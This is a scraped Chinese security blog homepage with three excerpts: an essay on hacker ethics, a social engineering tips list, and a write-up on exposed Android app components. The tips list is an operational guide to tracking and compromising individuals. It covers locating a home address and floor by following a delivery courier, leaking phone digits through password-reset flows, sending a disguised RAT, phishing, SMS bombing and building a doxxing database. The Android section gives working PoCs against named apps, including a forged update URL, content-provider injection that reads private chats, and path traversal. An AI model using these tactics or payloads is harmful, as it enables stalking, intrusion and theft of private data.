                            <a href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Java%20Web%20%E5%B7%A5%E7%A8%8B%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%A6%82%E7%95%A5/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/%E5%85%B3%E4%BA%8E%E6%8A%80%E6%9C%AF%E7%9A%84%E7%BA%AF%E7%B2%B9/">
                        关于技术的纯粹
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        这半年里，一直都在思考，安全是什么，黑客是什么，技术又是什么为什么会想这些东西呢在前边有篇随笔里记得说过挖过一段时间SRC，也就是现在很多人口中所谓的挖洞
1Burp一开，见洞就插，遇URL就遍历

描述的有点夸张了，不过说实话，足够的时间加上足够的细心，这些总是会挖到的这时候，会收到运营小姐姐的称赞，得到不菲的奖金，被称作“白帽子”“黑客”说到这里，需要解释一下，不是说这种模式不好，在企业安全这是不可或缺的一环，也有真正厉害的师傅在用真本事不过，这不是我想要的，在我看来，这并不能称之为“黑客”，所以我不再“挖洞”
在微信上偶然看到一篇文章，作者并不认识，但从字里行间可以看出作者是一个过来人，对于现在这个浮躁的圈子说的很中肯
12345678第三代黑客1、  挖洞2、  挖洞3、  挖洞4、  缺少专业知识和系统化概念5、  爱好混迹各种沙龙6、  擅长斗图、getshell、各种互联网找洞。7、  职业规划不明确，自身定位价值偏差

这是文中说的我们这代人，不可否认，大多数的确如此代码是一个黑客最基本的技能，可又有几人能说自己是一个合格的程序员这也是会思考上边那些东西的原因，对于自己，技术栈浅薄、通过这些行为的技术成长和时间不成正比，对于这个圈子，过于浮躁、过于追求名利
这里插一个小故事

图片里是我的一个学弟，审计处某个CMS的漏洞，通过QQ告诉开发者，什么都没有索取，开发者请喝一杯咖啡就足够高兴在我看来，这才是真正的黑客，技术且不论，单说这种对待技术的态度、对待金钱的态度是很珍贵的
对于此我自愧不如，到现在才真正的看透这一点
这里插一段上边文章中作者的建议
12341、安全不只是挖洞，甚至挖洞在乙方的工作量都占不到一般，更遑论甲方2、不要那么浮躁，静下心学些真正的安全技术3、多写点东西总没错，安全本就是综合性的能力4、进入安全圈，不是认识几个人，参加几次沙龙、提交几个漏洞、写过几篇挖洞或者工具利用的文章

这些建议在个人看来是很中肯的
本来在二十多天前就想写这篇随笔了，不过这段时间一是工作比较忙，更多的是还有一些地方没有想透，看到这篇文章的时候，好多地方写出了我所想的，遂打开电脑写下了这寥寥百字
现在的安全圈被许多大佬戏称为“娱乐圈”，事实上也确实是这个样子，圈外的人看到的总是那些所谓噱头的比赛、公众号、各种“黑客”字眼的文章，而恰恰这些东西的作者也是局外人，浮躁的局内人和他们一起就成了这个所谓的“安全圈”
并不是吃不到葡萄说葡萄酸，而是怀念以前的环境，更希望以后会重新变成以前的样子（不过随着国家的重视，各种心怀鬼胎的人涌入，注定会越来越浮躁）
在乌云笼罩的日子，一个帖子如果不能有绝对的干货，一定会被pass，一个漏洞提交，如果详细度不足以让审帖人员顺利复现，一定会被pass，厂商多久不修复，一定会被曝光，大家不为钱，不为名气，纯为技术，有几十个rank值是极大的荣幸，算是黑客乌托邦吧这个乌托邦注定回不来了，我们可以做的也只能是构建一个小小的“世外桃源”，只为了那点技术的纯粹，享受技术的本身
==========================好久没更新技术文章了，最近在研究浏览器挖掘领域，后边会更新一些学习笔记、漏洞分析前路漫漫，匍匐前行

                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>这半年里，一直都在思考，安全是什么，黑客是什么，技术又是什么<br>为什么会想这些东西呢<br>在前边有篇随笔里记得说过挖过一段时间SRC，也就是现在很多人口中所谓的挖洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Burp一开，见洞就插，遇URL就遍历</span><br></pre></td></tr></table></figure>

<p>描述的有点夸张了，不过说实话，足够的时间加上足够的细心，这些总是会挖到的<br>这时候，会收到运营小姐姐的称赞，得到不菲的奖金，被称作“白帽子”“黑客”<br>说到这里，需要解释一下，不是说这种模式不好，在企业安全这是不可或缺的一环，也有真正厉害的师傅在用真本事<br>不过，这不是我想要的，在我看来，这并不能称之为“黑客”，所以我不再“挖洞”</p>
<p>在微信上偶然看到一篇文章，作者并不认识，但从字里行间可以看出作者是一个过来人，对于现在这个浮躁的圈子说的很中肯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第三代黑客</span><br><span class="line">1、  挖洞</span><br><span class="line">2、  挖洞</span><br><span class="line">3、  挖洞</span><br><span class="line">4、  缺少专业知识和系统化概念</span><br><span class="line">5、  爱好混迹各种沙龙</span><br><span class="line">6、  擅长斗图、getshell、各种互联网找洞。</span><br><span class="line">7、  职业规划不明确，自身定位价值偏差</span><br></pre></td></tr></table></figure>

<p>这是文中说的我们这代人，不可否认，大多数的确如此<br>代码是一个黑客最基本的技能，可又有几人能说自己是一个合格的程序员<br>这也是会思考上边那些东西的原因，对于自己，技术栈浅薄、通过这些行为的技术成长和时间不成正比，对于这个圈子，过于浮躁、过于追求名利</p>
<p>这里插一个小故事</p>
<p><img lazyload src="/images/loading.svg" data-src="https://user-images.githubusercontent.com/12745454/32132606-ffb129aa-bbf8-11e7-83a0-cea28b280746.jpg" alt="tim 20171028155808"></p>
<p>图片里是我的一个学弟，审计处某个CMS的漏洞，通过QQ告诉开发者，什么都没有索取，开发者请喝一杯咖啡就足够高兴<br>在我看来，这才是真正的黑客，技术且不论，单说这种对待技术的态度、对待金钱的态度是很珍贵的</p>
<p>对于此我自愧不如，到现在才真正的看透这一点</p>
<p>这里插一段上边文章中作者的建议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、安全不只是挖洞，甚至挖洞在乙方的工作量都占不到一般，更遑论甲方</span><br><span class="line">2、不要那么浮躁，静下心学些真正的安全技术</span><br><span class="line">3、多写点东西总没错，安全本就是综合性的能力</span><br><span class="line">4、进入安全圈，不是认识几个人，参加几次沙龙、提交几个漏洞、写过几篇挖洞或者工具利用的文章</span><br></pre></td></tr></table></figure>

<p>这些建议在个人看来是很中肯的</p>
<p>本来在二十多天前就想写这篇随笔了，不过这段时间一是工作比较忙，更多的是还有一些地方没有想透，看到这篇文章的时候，好多地方写出了我所想的，遂打开电脑写下了这寥寥百字</p>
<p>现在的安全圈被许多大佬戏称为“娱乐圈”，事实上也确实是这个样子，圈外的人看到的总是那些所谓噱头的比赛、公众号、各种“黑客”字眼的文章，而恰恰这些东西的作者也是局外人，浮躁的局内人和他们一起就成了这个所谓的“安全圈”</p>
<p>并不是吃不到葡萄说葡萄酸，而是怀念以前的环境，更希望以后会重新变成以前的样子（不过随着国家的重视，各种心怀鬼胎的人涌入，注定会越来越浮躁）</p>
<p><code>在乌云笼罩的日子，一个帖子如果不能有绝对的干货，一定会被pass，一个漏洞提交，如果详细度不足以让审帖人员顺利复现，一定会被pass，厂商多久不修复，一定会被曝光，大家不为钱，不为名气，纯为技术，有几十个rank值是极大的荣幸，算是黑客乌托邦吧</code><br>这个乌托邦注定回不来了，我们可以做的也只能是构建一个小小的“世外桃源”，只为了那点技术的纯粹，享受技术的本身</p>
<p>==========================<br>好久没更新技术文章了，最近在研究浏览器挖掘领域，后边会更新一些学习笔记、漏洞分析<br>前路漫漫，匍匐前行</p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Oct 04 2017 21:00:00 GMT+0800">2017-10-04</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/">胡思乱想</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/THINK/">THINK</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/%E5%85%B3%E4%BA%8E%E6%8A%80%E6%9C%AF%E7%9A%84%E7%BA%AF%E7%B2%B9/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6TIPS/">
                        社会工程学TIPS
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        
通过朋友圈的运动信息、窗外风景照或者定位确定家庭住址
具体楼层通过给对方订份外卖，跟踪外卖员确认
在网络上发布假消息，防止被跟踪
在有qq的前提下通过qq安全中心获取手机号前三位，确定归属地
通过支付宝忘记密码获取手机后二位，搜索邮箱功能获取真实名字
爆破中间位数，生成手机号列表导入通讯录，通过qq匹配通讯录，查看头像等确认
支付宝转账确认真实姓名
将手机号添加到通讯录中，然后通过手机号的各种社交软件获取好友（重要）
通过手机号获取真是微信号
搜索引擎搜索以上内容
有针对性的伪装打入内部，改号软件、变声软件
发送伪装的RAT控制目标机器
IP确认物理地址
whois获取联系方式，邮箱反查
图片原图获取经纬度信息
伪装自己（灰色角色），获取信任
qq旧版资料卡寻找有用信息
微博信息（新浪、腾讯）
钓鱼页面，获取信息
善用PS进行账号申诉，同时通过短信轰炸干扰对方
在有收货地址的情况下，利用badusb获取目标机器权限
贴吧账号找回功能获取手机后两位，微博获取后三位
阿里云云市场api通过身份证号查询头像
某版qq获取登陆ip
构建社工库


                    
                </div> -->
                <div class="article-content markdown-body">
                    <ul>
<li>通过朋友圈的运动信息、窗外风景照或者定位确定家庭住址</li>
<li>具体楼层通过给对方订份外卖，跟踪外卖员确认</li>
<li>在网络上发布假消息，防止被跟踪</li>
<li>在有qq的前提下通过qq安全中心获取手机号前三位，确定归属地</li>
<li>通过支付宝忘记密码获取手机后二位，搜索邮箱功能获取真实名字</li>
<li>爆破中间位数，生成手机号列表导入通讯录，通过qq匹配通讯录，查看头像等确认</li>
<li>支付宝转账确认真实姓名</li>
<li>将手机号添加到通讯录中，然后通过手机号的各种社交软件获取好友（重要）</li>
<li>通过手机号获取真是微信号</li>
<li>搜索引擎搜索以上内容</li>
<li>有针对性的伪装打入内部，改号软件、变声软件</li>
<li>发送伪装的RAT控制目标机器</li>
<li>IP确认物理地址</li>
<li>whois获取联系方式，邮箱反查</li>
<li>图片原图获取经纬度信息</li>
<li>伪装自己（灰色角色），获取信任</li>
<li>qq旧版资料卡寻找有用信息</li>
<li>微博信息（新浪、腾讯）</li>
<li>钓鱼页面，获取信息</li>
<li>善用PS进行账号申诉，同时通过短信轰炸干扰对方</li>
<li>在有收货地址的情况下，利用badusb获取目标机器权限</li>
<li>贴吧账号找回功能获取手机后两位，微博获取后三位</li>
<li>阿里云云市场api通过身份证号查询头像</li>
<li>某版qq获取登陆ip</li>
<li>构建社工库</li>
</ul>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue Aug 22 2017 21:00:00 GMT+0800">2017-08-22</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B/">社会工程</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/Social/">Social</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6TIPS/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Android%E7%BB%84%E4%BB%B6%E6%9A%B4%E9%9C%B2%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/">
                        Android组件暴露的安全性
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        0x01 关于组件Android开发四大组件分别是：活动(Activity)：用于表现功能服务(Service)：后台运行服务，不提供界面呈现广播接收器(BroadcastReceiver)：用于接收广播内容提供商（ContentProvider）：支持在多个应用中存储和读取数据，相当于数据库外链:详细讲解
在Android应用中，多一个组件暴露，就多一个攻击面。而攻击者就可以围绕这些攻击面进行测试，构造多种攻击手段。
0x02 exported属性在AndroidManifest.xml文件中，四大组件都有android:exported属性，是个boolean值，可以为true或false这里有个值得注意的点默认值以有无intent-filter的action属性来决定，有则为true，没有则为false
0x03 实例1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题Android应用本地拒绝服务漏洞源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用，导致其崩溃
例如导出的Broadcast Receiver组件可以被第三方APP任意调用，如果再没有对消息进行验证，就可能导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险
e.g. 某手机管家com.tencent.qqpimsecure.service.InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常POC：
1234Intent i = new Intent();ComponentName componetName = new ComponentName(  &quot;com.tencent.qqpimsecure&quot;,  &quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;);         i.setComponent(componetName);       sendBroadcast(i);

漏洞详情及解决方案
2、绕过本地认证私有Activity不应被其他应用启动相对是安全的（只是相对的）公开暴露的Activity组件，可以被任意应用启动
e.g. 某菊花网盘绕过本地密码非root的话直接启动其他activity即可绕过认证，本地认证只是简单topActivity
1234567891011public void activityStart(View v) &#123;		ComponentName componetName = new ComponentName(&quot;com.huawei.dbank.v7&quot;,				&quot;com.huawei.dbank.v7.ui.newbietask.NewbieTaskActivity&quot;);		try &#123;			Intent intent = new Intent();			intent.setComponent(componetName);			startActivity(intent);		&#125; catch (Exception e) &#123;			Toast.makeText(getApplicationContext(), &quot;Not found&quot;, 0).show();		&#125;	&#125;

e.g. 控制MIUI的手电筒开关（有趣的案例）MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒
123Intent intent = new Intent();        intent.setAction(&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;);        sendBroadcast(intent);

3、伪造消息代码执行广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码
e.g. 某搜索引擎云盘123456789101112131415161718192021Intent i = new Intent();        i.setAction(&quot;com.baidu.android.pushservice.action.MESSAGE&quot;);        Bundle b = new Bundle();        try &#123;        	JSONObject jsobject = new JSONObject();            JSONObject custom_content_js = new JSONObject();        	jsobject.put(&quot;title&quot;, &quot;xxxxxxxxxxx&quot;);        	jsobject.put(&quot;description&quot;, &quot;&quot;)        	jsobject.put(&quot;url&quot;, &quot;http://drops.wooyun.org/webview.html&quot;);        	JSONObject customcontent_js = new JSONObject();       	        	customcontent_js.put(&quot;type&quot;, &quot;1&quot;);        	customcontent_js.put(&quot;msg_type&quot;, &quot;resources_push&quot;);        	customcontent_js.put(&quot;uk&quot;, &quot;1&quot;);        	customcontent_js.put(&quot;shareId&quot;, &quot;1&quot;);  	        	jsobject.put(&quot;custom_content&quot;, customcontent_js);   			String cmd  = jsobject.toString();			b.putByteArray(&quot;message&quot;, cmd.getBytes(&quot;UTF-8&quot;));		&#125; catch (Exception e) &#123;			e.printStackTrace();		&#125;

e.g. 优酷Android 4.5客户端升级漏洞com.youku.service.push.StartActivityService组件从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址
POC
12345678PushMsg pushMsg = new PushMsg();pushMsg.type = 1;pushMsg.updateurl = &quot;http://**.**.**.**/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;;pushMsg.updatecontent = &quot;This is Fake&quot;;Intent intent = new Intent();intent.setClassName(&quot;com.youku.phone&quot;,&quot;com.youku.service.push.StartActivityService&quot;);intent.putExtra(&quot;PushMsg&quot;, pushMsg);startService(intent);

4、敏感信息泄漏e.g. 某应用隐式intent发送敏感信息缺陷代码
123456789101112131415public class ServerService extends Service &#123;  private void d() &#123;    Intent v1 = new Intent();    v1.setAction(&quot;com.sample.action.server_running&quot;);    v1.putExtra(&quot;local_ip&quot;, v0.h);    v1.putExtra(&quot;port&quot;, v0.i);    v1.putExtra(&quot;code&quot;, v0.g);    v1.putExtra(&quot;connected&quot;, v0.s);    v1.putExtra(&quot;pwd_predefined&quot;, v0.r);    if (!TextUtils.isEmpty(v0.t)) &#123;      v1.putExtra(&quot;connected_usr&quot;, v0.t);    &#125;  &#125;  this.sendBroadcast(v1);&#125;
POC
123456789101112public class BcReceiv extends BroadcastReceiver &#123;  @Override  public void onReceive(Context context, Intent intent)&#123;    String s = null;    if (intent.getAction().equals(&quot;com.sample.action.server_running&quot;))&#123;      String pwd = intent.getStringExtra(&quot;connected&quot;);      s = &quot;Airdroid  =&gt; [&quot; + pwd + &quot;]/&quot; + intent.getExtras();    &#125;    Toast.makeText(context, String.format(&quot;%s Received&quot;, s),                   Toast.LENGTH_SHORT).show();  &#125;&#125;
5、提升权限e.g. 某系统清理工具暴露了com.cleanmaster.appwidget.WidgetService服务组件，当向此服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程
6、Content Provider 暴露泄露敏感信息Content Provider 用来存放和获取数据并使这些数据可以被所有的应用程序访问，是应用程序之间共享数据的唯一方法
e.g. 一只眼app应用本地信息泄露任意Android程序不需要任何权限就能获取本机一支眼app的所有数据，包括账号、私信聊天记录
查看聊天记录POC
12345678910111213141516public void getChatMsg() &#123;    	String[] projection = &#123;&quot;* from im_message_table--&quot;&#125;;    	Uri uri = Uri.parse(&quot;content://com.sina.weibo.blogProvider/query/im&quot;);    	Cursor mCursor = getContentResolver().query(uri, projection, null, null, null);    	if (null == mCursor) &#123;    		Toast.makeText(mContext, &quot;null cursor&quot;, Toast.LENGTH_SHORT).show();    	&#125; else if (mCursor.getCount() &lt; 1) &#123;    		Toast.makeText(mContext, &quot;count less than 1&quot;, Toast.LENGTH_SHORT).show();    	&#125; else &#123;    		String text = &quot;&quot;;    		while (mCursor.moveToNext()) &#123;    	        text += mCursor.getString(mCursor.getColumnIndex(&quot;content&quot;));    	    &#125;    		mTextView.setText(text);    	&#125;    &#125;

7、任意文件读取漏洞e.g. 某客户端Content Provider组件任意文件读取漏洞某客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=”true”,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”../“实现目录跨越，实现对任意私有数据的访问
POC
123456789101112131415public void GJContentProviderFileOperations()&#123;     try&#123; 	    InputStream in = getContentResolver().openInputStream(Uri.parse(&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;)); 		ByteArrayOutputStream out = new ByteArrayOutputStream(); 		byte[] buffer = new byte[1024]; 		int n = in.read(buffer); 		while(n&gt;0)&#123; 		    out.write(buffer, 0, n); 			n = in.read(buffer); 			Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); 	    &#125; 	&#125;catch(Exception e)&#123; 	    debugInfo(e.getMessage()); 	&#125; &#125;
漏洞详解
8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）存在一个私有组件A，和一个对外导出组件B。如果B能够根据对外传入的Intent中的内容打开私有组件A，同时启动私有组件A的Intent的内容来自启动导出组件B的Intent的内容，那么攻击者就可以通过对外导出组件B，去控制私有导出组件A。这就可能会造成严重的安全风险这里详细的看下聚安全的这篇paper
其实还有很多没有列出，如UXSS、界面劫持、services劫持等等0x04 简单自测1、反编译APK或直接查看源代码查看AndroidManifest.xml文件，查看哪些组件是导出的，仔细check是否需要导出，需要导出的是否都已做了相应的安全限制
2、drozer扫描run app.activity.info -a packagename
0x05 防患于未然1、能不导出组件的坚决不导出2、必须导出的组件仔细check限制策略是否到位3、检查该组件能不能根据该组件的intent去启动其他私有组件4、如果能启动私有组件，根据业务严格控制过滤和校验intent中的内容，同时被启动的私有组件需要做好各种安全防范


关于漏洞例子：本来想用最近遇到的问题来做实例，但考虑到漏洞的敏感性，找的是网上公开的漏洞



                    
                </div> -->
                <div class="article-content markdown-body">
                    <h3 id="0x01-关于组件"><a href="#0x01-关于组件" class="headerlink" title="0x01 关于组件"></a>0x01 关于组件</h3><p>Android开发四大组件分别是：<br><code>活动(Activity)：用于表现功能</code><br><code>服务(Service)：后台运行服务，不提供界面呈现</code><br><code>广播接收器(BroadcastReceiver)：用于接收广播</code><br><code>内容提供商（ContentProvider）：支持在多个应用中存储和读取数据，相当于数据库</code><br><a class="link" target="_blank" rel="noopener" href="http://www.cnblogs.com/bravestarrhu/archive/2012/05/02/2479461.html">外链:详细讲解<i class="fas fa-external-link-alt"></i></a></p>
<p>在Android应用中，多一个组件暴露，就多一个攻击面。而攻击者就可以围绕这些攻击面进行测试，构造多种攻击手段。</p>
<h3 id="0x02-exported属性"><a href="#0x02-exported属性" class="headerlink" title="0x02 exported属性"></a>0x02 exported属性</h3><p>在AndroidManifest.xml文件中，四大组件都有android:exported属性，是个boolean值，可以为true或false<br>这里有个值得注意的点<br><code>默认值以有无intent-filter的action属性来决定，有则为true，没有则为false</code></p>
<h3 id="0x03-实例"><a href="#0x03-实例" class="headerlink" title="0x03 实例"></a>0x03 实例</h3><h4 id="1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题"><a href="#1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题" class="headerlink" title="1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题"></a>1、最常见的莫过于<code>本地拒绝服务漏洞</code>，四大组件都存在这个问题</h4><p>Android应用本地拒绝服务漏洞源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用，导致其崩溃</p>
<p>例如导出的Broadcast Receiver组件可以被第三方APP任意调用，如果再没有对消息进行验证，就可能导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险</p>
<h6 id="e-g-某手机管家com-tencent-qqpimsecure-service-InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常"><a href="#e-g-某手机管家com-tencent-qqpimsecure-service-InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常" class="headerlink" title="e.g. 某手机管家com.tencent.qqpimsecure.service.InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常"></a>e.g. 某手机管家com.tencent.qqpimsecure.service.InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常</h6><p>POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">ComponentName componetName = new ComponentName(  &quot;com.tencent.qqpimsecure&quot;,  &quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;);         </span><br><span class="line">i.setComponent(componetName);       </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure>
<p><img lazyload src="/images/loading.svg" data-src="15190503919800.png"></p>
<p><a class="link" target="_blank" rel="noopener" href="http://jaq.alibaba.com/blog.htm?id=55">漏洞详情及解决方案<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="2、绕过本地认证"><a href="#2、绕过本地认证" class="headerlink" title="2、绕过本地认证"></a>2、绕过本地认证</h4><p>私有Activity不应被其他应用启动相对是安全的（只是相对的）<br>公开暴露的Activity组件，可以被任意应用启动</p>
<h6 id="e-g-某菊花网盘绕过本地密码"><a href="#e-g-某菊花网盘绕过本地密码" class="headerlink" title="e.g. 某菊花网盘绕过本地密码"></a>e.g. 某菊花网盘绕过本地密码</h6><p>非root的话直接启动其他activity即可绕过认证，本地认证只是简单topActivity</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public void activityStart(View v) &#123;</span><br><span class="line">		ComponentName componetName = new ComponentName(&quot;com.huawei.dbank.v7&quot;,</span><br><span class="line">				&quot;com.huawei.dbank.v7.ui.newbietask.NewbieTaskActivity&quot;);</span><br><span class="line">		try &#123;</span><br><span class="line">			Intent intent = new Intent();</span><br><span class="line">			intent.setComponent(componetName);</span><br><span class="line">			startActivity(intent);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			Toast.makeText(getApplicationContext(), &quot;Not found&quot;, 0).show();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h6 id="e-g-控制MIUI的手电筒开关（有趣的案例）"><a href="#e-g-控制MIUI的手电筒开关（有趣的案例）" class="headerlink" title="e.g. 控制MIUI的手电筒开关（有趣的案例）"></a>e.g. 控制MIUI的手电筒开关（有趣的案例）</h6><p>MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">        intent.setAction(&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;);</span><br><span class="line">        sendBroadcast(intent);</span><br></pre></td></tr></table></figure>

<h4 id="3、伪造消息代码执行"><a href="#3、伪造消息代码执行" class="headerlink" title="3、伪造消息代码执行"></a>3、伪造消息代码执行</h4><p>广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码</p>
<h6 id="e-g-某搜索引擎云盘"><a href="#e-g-某搜索引擎云盘" class="headerlink" title="e.g. 某搜索引擎云盘"></a>e.g. 某搜索引擎云盘</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">        i.setAction(&quot;com.baidu.android.pushservice.action.MESSAGE&quot;);</span><br><span class="line">        Bundle b = new Bundle();</span><br><span class="line">        try &#123;</span><br><span class="line">        	JSONObject jsobject = new JSONObject();</span><br><span class="line">            JSONObject custom_content_js = new JSONObject();</span><br><span class="line">        	jsobject.put(&quot;title&quot;, &quot;xxxxxxxxxxx&quot;);</span><br><span class="line">        	jsobject.put(&quot;description&quot;, &quot;&quot;)</span><br><span class="line">        	jsobject.put(&quot;url&quot;, &quot;http://drops.wooyun.org/webview.html&quot;);</span><br><span class="line">        	JSONObject customcontent_js = new JSONObject();       	</span><br><span class="line">        	customcontent_js.put(&quot;type&quot;, &quot;1&quot;);</span><br><span class="line">        	customcontent_js.put(&quot;msg_type&quot;, &quot;resources_push&quot;);</span><br><span class="line">        	customcontent_js.put(&quot;uk&quot;, &quot;1&quot;);</span><br><span class="line">        	customcontent_js.put(&quot;shareId&quot;, &quot;1&quot;);  	</span><br><span class="line">        	jsobject.put(&quot;custom_content&quot;, customcontent_js);   </span><br><span class="line">			String cmd  = jsobject.toString();</span><br><span class="line">			b.putByteArray(&quot;message&quot;, cmd.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

